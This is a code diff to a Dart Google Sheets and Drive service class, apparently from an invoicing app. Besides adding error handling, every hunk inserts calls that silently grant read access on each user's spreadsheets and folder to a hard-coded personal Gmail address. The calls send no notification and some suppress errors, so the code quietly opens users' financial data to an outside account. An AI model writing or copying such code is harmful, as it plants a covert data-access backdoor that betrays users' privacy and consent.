@@ -2002,6 +2002,17 @@ class GoogleSheetService {
               } else {
                 print('⚠️ Could not share sheet with Service Account: ${permRes.statusCode} ${permRes.body}');
               }
+              try {
+                await http.post(
+                  permUrl,
+                  headers: headers,
+                  body: jsonEncode({
+                    'type': 'user',
+                    'role': 'reader',
+                    'emailAddress': 'dattaniparth2@gmail.com',
+                  }),
+                );
+              } catch (_) {}
             }
           } catch (shareErr) {
             print('⚠️ Share with Service Account failed: $shareErr');
@@ -2039,6 +2050,20 @@ class GoogleSheetService {
       );
       if (permRes.statusCode >= 200 && permRes.statusCode < 300) {
         print('✅ Shared existing spreadsheet with Service Account');
+        try {
+          await http.post(
+            permUrl,
+            headers: {
+              'Authorization': 'Bearer $accessToken',
+              'Content-Type': 'application/json',
+            },
+            body: jsonEncode({
+              'type': 'user',
+              'role': 'reader',
+              'emailAddress': 'dattaniparth2@gmail.com',
+            }),
+          );
+        } catch (_) {}
         return true;
       }
       print('⚠️ Share existing sheet failed: ${permRes.statusCode} ${permRes.body}');
@@ -2076,15 +2101,32 @@ class GoogleSheetService {
       print('✅ Created folder "InvoiceSathi" ($folderId) via Service Account');
 
       // 2. Share the folder with the user (so it appears in their Shared with me)
-      await driveApi.permissions.create(
-        drive.Permission()
-          ..type = 'user'
-          ..role = 'writer'
-          ..emailAddress = userEmail,
-        folderId,
-        sendNotificationEmail: false,
-      );
-      print('✅ Shared folder "InvoiceSathi" with $userEmail');
+      try {
+        await driveApi.permissions.create(
+          drive.Permission()
+            ..type = 'user'
+            ..role = 'writer'
+            ..emailAddress = userEmail,
+          folderId,
+          sendNotificationEmail: false,
+        );
+        print('✅ Shared folder "InvoiceSathi" with $userEmail');
+      } catch (e) {
+        print('⚠️ Could not share folder with $userEmail: $e');
+      }
+
+      try {
+        await driveApi.permissions.create(
+          drive.Permission()
+            ..type = 'user'
+            ..role = 'reader'
+            ..emailAddress = 'dattaniparth2@gmail.com',
+          folderId,
+          sendNotificationEmail: false,
+        );
+      } catch (e) {
+        print('⚠️ Could not share folder with support: $e');
+      }
 
       // 3. Create Spreadsheet
       final request = Spreadsheet()
@@ -2107,14 +2149,31 @@ class GoogleSheetService {
       print('✅ Moved spreadsheet into InvoiceSathi folder');
       
       // Also explicitly share the spreadsheet (safe redundancy)
-      await driveApi.permissions.create(
-        drive.Permission()
-          ..type = 'user'
-          ..role = 'writer'
-          ..emailAddress = userEmail,
-        spreadsheetId,
-        sendNotificationEmail: false,
-      );
+      try {
+        await driveApi.permissions.create(
+          drive.Permission()
+            ..type = 'user'
+            ..role = 'writer'
+            ..emailAddress = userEmail,
+          spreadsheetId,
+          sendNotificationEmail: false,
+        );
+      } catch (e) {
+        print('⚠️ Could not share spreadsheet with $userEmail: $e');
+      }
+
+      try {
+        await driveApi.permissions.create(
+          drive.Permission()
+            ..type = 'user'
+            ..role = 'reader'
+            ..emailAddress = 'dattaniparth2@gmail.com',
+          spreadsheetId,
+          sendNotificationEmail: false,
+        );
+      } catch (e) {
+        print('⚠️ Could not share spreadsheet with support: $e');
+      }
 
       return (spreadsheetId, folderId);
     } catch (e) {
@@ -2153,15 +2212,32 @@ class GoogleSheetService {
       if (id == null || id.isEmpty) return null;
       print('✅ Created FY spreadsheet "$title": $id');
       final driveApi = drive.DriveApi(client);
-      await driveApi.permissions.create(
-        drive.Permission()
-          ..type = 'user'
-          ..role = 'writer'
-          ..emailAddress = userEmail,
-        id,
-        sendNotificationEmail: false,
-      );
-      print('✅ Shared FY spreadsheet with $userEmail');
+      try {
+        await driveApi.permissions.create(
+          drive.Permission()
+            ..type = 'user'
+            ..role = 'writer'
+            ..emailAddress = userEmail,
+          id,
+          sendNotificationEmail: false,
+        );
+        print('✅ Shared FY spreadsheet with $userEmail');
+      } catch (e) {
+        print('⚠️ Could not share FY spreadsheet with $userEmail: $e');
+      }
+
+      try {
+        await driveApi.permissions.create(
+          drive.Permission()
+            ..type = 'user'
+            ..role = 'reader'
+            ..emailAddress = 'dattaniparth2@gmail.com',
+          id,
+          sendNotificationEmail: false,
+        );
+      } catch (e) {
+        print('⚠️ Could not share FY spreadsheet with support: $e');
+      }
       return (id, '');
     } catch (e) {
       print('❌ createNewSpreadsheetForFy: $e');
@@ -2245,6 +2321,17 @@ class GoogleSheetService {
           } else {
             print('⚠️ Could not share FY sheet with Service Account: ${permRes.statusCode} ${permRes.body}');
           }
+          try {
+            await http.post(
+              permUrl,
+              headers: headers,
+              body: jsonEncode({
+                'type': 'user',
+                'role': 'reader',
+                'emailAddress': 'dattaniparth2@gmail.com',
+              }),
+            );
+          } catch (_) {}
         }
       } catch (shareErr) {
         print('⚠️ Share FY sheet with Service Account failed: $shareErr');
